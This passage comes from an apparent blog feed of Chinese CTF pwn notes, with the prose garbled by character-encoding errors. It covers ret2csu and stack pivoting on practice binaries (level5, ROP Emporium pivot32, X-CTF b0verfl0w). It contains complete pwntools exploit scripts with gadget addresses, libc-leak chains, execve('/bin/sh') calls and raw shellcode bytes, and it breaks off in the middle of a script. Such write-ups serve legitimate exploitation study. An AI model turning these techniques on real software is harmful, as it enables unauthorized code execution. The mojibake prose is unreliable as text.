class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) çš„å«ä¹‰ä¸ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–æœ€å¤š 16 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¹¶å°†æ•°æ®å­˜å‚¨åˆ°ä½äº <code>bss_base</code> åœ°å€å¤„çš„ç¼“å†²åŒºä¸­ã€‚</p></blockquote><p>æœ€åè°ƒç”¨æ‰§è¡Œ <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>æ€»çš„expä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>å¾ˆèœèœçš„ROPï¼ŒæŠŠç¬”è®°æ”¶æ‹¾æ”¶æ‹¾å‘ä¸€ä¸‹ã€‚</p><p>æœ¬æ¥æƒ³è¯´æ ˆä¸Šå…¨éƒ¨ä¸œè¥¿éƒ½æå®Œå†å‘ï¼Œä½†æœ€è¿‘githubä¸Šçš„ç»¿ç‚¹ç‚¹éƒ½å°‘äº†å°±æå‰å‘ä¸€éƒ¨åˆ†å–½ğŸ˜¢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çœŸçš„å¾ˆèœèœçš„ROP</title>
    <link href="/2023/06/21/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>æ ˆä¸Šçš„ä¸é‚£ä¹ˆç®€å•å°ç©æ„ä»¬</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (å †æ ˆè½¬ç§»)ï¼ŒåŸºæœ¬æ€æƒ³æ˜¯åˆ©ç”¨å·²æœ‰çš„å†…å­˜åŒºåŸŸæˆ–æ•°æ®ç»“æ„ï¼ˆä¾‹å¦‚å †ï¼‰æ¥æ„é€ ä¸€ä¸ªæ–°çš„å †æ ˆï¼Œç„¶åå°†ç¨‹åºçš„æ§åˆ¶æµè½¬ç§»åˆ°è¯¥å †æ ˆä¸Šæ‰§è¡Œã€‚é€šè¿‡å°†å †æ ˆæŒ‡é’ˆ (ESP&#x2F;RSP) è®¾ç½®ä¸ºæ–°çš„å †æ ˆåœ°å€ï¼Œå¹¶åœ¨è¯¥å †æ ˆä¸Šæ„é€ åˆé€‚çš„å‡½æ•°è°ƒç”¨å¸§ï¼Œå¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€‚</p><p>é€šå¸¸åœ¨å†…å­˜å¸ƒå±€å—é™æˆ–æŸäº›ä¿æŠ¤æœºåˆ¶å­˜åœ¨çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><p>åˆ©ç”¨stack pivotingæœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹å¾ï¼š</p><ul><li>æ ˆå¯ä»¥æ§åˆ¶çš„ç©ºé—´è¿‡å°ä¸è¶³ä»¥æ„é€ å®Œæ•´çš„ropé“¾</li><li>å¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸ</li></ul><h4 id="ğŸŒ°-1ï¼š"><a href="#ğŸŒ°-1ï¼š" class="headerlink" title="ğŸŒ°_1ï¼š"></a>ğŸŒ°_1ï¼š</h4><p>å‘ç°äº†ä¸€ä¸ªé¶åœºï¼š<a href="https://ropemporium.com/">ROP Emporium</a>ï¼Œé€‰æ‹©pivot-x_86</p><p>ç»™çš„å‹ç¼©åŒ…é‡Œè¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ <code>libpivot32.so</code>ï¼Œchecksec ä¸€ä¸‹ç”šè‡³å‡ºç°äº†æ²¡è§è¿‡çš„ç©æ„ <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ª  RUNPATH:  â€˜.â€™  çš„æ„æ€æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œæ—¶è·¯å¾„ï¼ˆrun-time search pathï¼‰è®¾ç½®ä¸ºå½“å‰ç›®å½•ï¼ˆâ€™.â€™ï¼‰ï¼Œä¹Ÿå°±æ˜¯å®ƒè¿è¡Œæ—¶ä¼šä½¿ç”¨é¢˜ç›®æ‰€ç»™çš„åŠ¨æ€é“¾æ¥åº“</p></blockquote><p>ç›´æ¥åœ¨linuxé‡Œè¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼Œè¿™ä¸ªç¨‹åºæœ‰æœ‰ä¸¤ä¸ªè¾“å…¥ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>åç¼–è¯‘ä¸€ä¸‹è¿™ä¸ªç¨‹åºçš„mainå‡½æ•°ï¼Œå¤åˆ¶ä¸€ä¸‹æºç å†™ä¸ªæ³¨é‡Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//åˆ†é…ä¸€ä¸ª0x1000000uçš„å†…å­˜å—ï¼Œå¹¶å°†å…¶åœ°å€èµ‹å€¼ç»™ptræŒ‡é’ˆ</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//æ£€æŸ¥å†…å­˜åˆ†é…æ˜¯å¦æˆåŠŸï¼Œå¦‚æœå¤±è´¥åˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºã€‚</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//è°ƒç”¨pwnmeå‡½æ•°ï¼Œå°†ptræŒ‡é’ˆåç§»16776960å­—èŠ‚çš„ä½ç½®ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒã€‚</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//é‡Šæ”¾å…ˆå‰åˆ†é…çš„å†…å­˜å—</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°mainå‡½æ•°é‡Œæ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼Œä½†æ˜¯åœ¨<code>pwnme</code>å‡½æ•°é‡Œå‘ç°<code>read()</code>æ²¡æœ‰è¾“å…¥é•¿åº¦çš„éªŒè¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>å…¶ä¸­åœ¨ç¬¬äºŒä¸ªè¾“å…¥æº¢å‡ºæ—¶ï¼Œåªæœ‰<code>(0x38-0x28-4)</code>å³12ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºå¯ä»¥åˆ©ç”¨ï¼Œæ— æ³•ç›´æ¥åœ¨æ ˆä¸Šæ„é€ ropé“¾ã€‚é¢˜ç›®ä¹Ÿæœ‰æç¤ºï¼Œæˆ‘ä»¬éœ€è¦å°†ropé“¾å­˜åˆ°bufä¸­ï¼Œå†å°†æ ˆè½¬ç§»åˆ°bufä¸Šã€‚</p><p>æˆ‘ä»¬å‘ç°putsä¸€æ¡æ–‡æœ¬<code>Call ret2win() from libpivot</code>ï¼Œæ²¡æœ‰åœ¨è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­å‘ç°è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯é¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ <code>libpivot32.so</code>ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¨‹åºè·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œä¸ºæˆ‘ä»¬æ‰“å¼€flagã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£å‡½æ•°åœ¨æ‰§è¡Œç»“æŸåä¼šæ‰§è¡Œçš„ <code>leave;ret</code> è¿™æ¡æ±‡ç¼–ä»£ç çš„å«ä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, ç›¸å½“äºæ‰§è¡Œ<br>mov esp, ebp<br>pop ebp<br><br># retn, ç›¸å½“äºæ‰§è¡Œ<br>pop eip<br><br>#æ‰§è¡ŒleaveæŒ‡ä»¤åï¼Œé¦–å…ˆç»˜å°†ebpçš„å€¼èµ‹ç»™espï¼Œç„¶ååšä¸€ä¸ªå‡ºæ ˆæ“ä½œï¼Œæ ˆæŒ‡é’ˆä¼šå‘æ ˆåº•ç§»åŠ¨ä¸€ä¸ªåœ°å€ã€‚æ­¤æ—¶æ‰§è¡Œretï¼Œå°±ä¼šè·³è½¬åˆ°æ–°çš„æ ˆé¡¶æŒ‡é’ˆçš„åœ°å€ï¼Œå³åŸebpå­˜å‚¨çš„åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€ã€‚<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ROPgadgetsæŸ¥æ‰¾å¯¹åº”çš„ä»£ç ç‰‡æ®µ <code>ROPgadget --binary pivot32 --only &quot;leave|ret&quot;</code></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-17-07.png"></p><p>æ ¹æ®æ ˆç»“æ„æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„payloadï¼š</p><table><thead><tr><th>Stack</th><th align="center">buffer</th><th align="center">EBP</th><th align="center">return_addr</th></tr></thead><tbody><tr><td>Payload</td><td align="center">buffer padding</td><td align="center">fake EBP</td><td align="center">retn_addr</td></tr></tbody></table><ul><li>buffer paddingï¼šåœ¨è¾“å…¥æ•°æ®ä¹‹å‰æ·»åŠ ä¸€äº›å¡«å……æ•°æ®ï¼Œä»¥è¾¾åˆ°è¦†ç›–EBPå’Œreturn_addrçš„ç›®çš„ã€‚</li><li>fake EBPï¼šæ„é€ ä¸€ä¸ªä¼ªé€ çš„EBPå€¼ï¼Œå°†å…¶è®¾ç½®ä¸ºæ”»å‡»è€…æ§åˆ¶çš„ç›®æ ‡åœ°å€ã€‚è¿™æ ·ï¼Œåœ¨å‡½æ•°æ‰§è¡Œ<code>leave</code>æŒ‡ä»¤æ—¶ï¼Œå°†ä¼šæŠŠEBPçš„å€¼è®¾ç½®ä¸ºæ”»å‡»è€…æ§åˆ¶çš„ç›®æ ‡åœ°å€ã€‚</li><li>retn_addrï¼šè®¾ç½®è¿”å›åœ°å€ä¸ºROPé“¾çš„èµ·å§‹åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡ŒROPé“¾ä¸­çš„æŒ‡ä»¤åºåˆ—ã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥æº¢å‡ºåˆ°ebpï¼Œä»è€Œå®ç°eipçš„åŠ«æŒï¼Œå®Œæˆæ ˆè½¬ç§»ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºæ‰§è¡Œåˆ°æˆ‘ä»¬å¡«å…¥çš„<code>leave;ret</code>æŒ‡ä»¤ä¹‹å‰ï¼Œè‡ªå·±ä¹Ÿæ‰§è¡Œäº†ä¸€æ¬¡è¯¥æŒ‡ä»¤ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæŒ‡ä»¤è¢«æ‰§è¡Œäº†ä¸¤æ¬¡</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>ç”±äºæ¯æ¬¡retéƒ½ä¼šä½¿å¾—esp+4ï¼Œæ‰€ä»¥ï¼Œä¼ªé€ çš„ebpçš„åœ°å€è¦å‡å»4ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#è¿™é‡Œéœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡foothold_functionï¼Œå°†å®ƒçš„åœ°å€åŠ è½½åˆ°got.pltä¸­ï¼Œæˆ‘ä»¬æ‰èƒ½è¿›è¡Œåç»­çš„æ›¿æ¢</span><br><span class="hljs-comment">#payloadå«ä¹‰ä¸ºï¼Œå°†eaxèµ‹å€¼ä¸ºfoothold_functionçš„çœŸå®åœ°å€ï¼Œå†å°†ebxèµ‹å€¼ä¸ºfoothold_functionå’Œret2winçš„åç§»ï¼Œæœ€åå°†ebxåŠ åˆ°eaxä¸Šï¼Œè°ƒç”¨ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2"><a href="#ğŸŒ°-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>é¢˜ç›®æ‹¿åˆ°æ‰‹å…ˆæŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç å‘ç°vulå‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>ä½†æ˜¯å¯æ§åˆ¶çš„èŒƒå›´å¾ˆå°åªæœ‰50-32-4&#x3D;14ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°±è€ƒè™‘ stack pivoting ã€‚ç”±äºç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰å¼€å¯å †æ ˆä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šå¸ƒç½® shellcode å¹¶æ‰§è¡Œã€‚</p><p>æ„é€ å®Œshellcodeä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å¯¹ esp è¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘ shellcode å¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³ esp å¤„ã€‚</p><p>æŸ¥æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>å…¶ä¸­<code>0x08048504</code>æœ‰ç›´æ¥è·³è½¬åˆ°espçš„ç‰‡æ®µï¼Œ</p><p>ä¿®æ”¹æ ˆä¸Šçš„è¿”å›åœ°å€ä¸º<code>jmp esp</code>çš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºå°±ä¼šè·³è½¬åˆ°æ ˆé¡¶æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€å¤„æ‰§è¡Œpayloadã€‚</p><p>æ„é€ ç»“æ„å¦‚ä¸‹ï¼š</p><p>shellcode+padding&#x3D;0x20ï¼Œfake ebp&#x3D;0x4ï¼Œjmp_esp&#x3D;0x4</p><p>ä¸ºäº†ä¿è¯æ ˆä¸Šæœ‰è¶³å¤Ÿçš„ç©ºé—´æ‰§è¡Œpayloadï¼Œæˆ‘ä»¬èƒ½å°†æ ˆæŒ‡é’ˆå‘ä¸‹è°ƒæ•´ï¼Œå³sub esp, 0x28;jmp espã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#å…ˆåˆ©ç”¨sub esp, 0x28;jmp 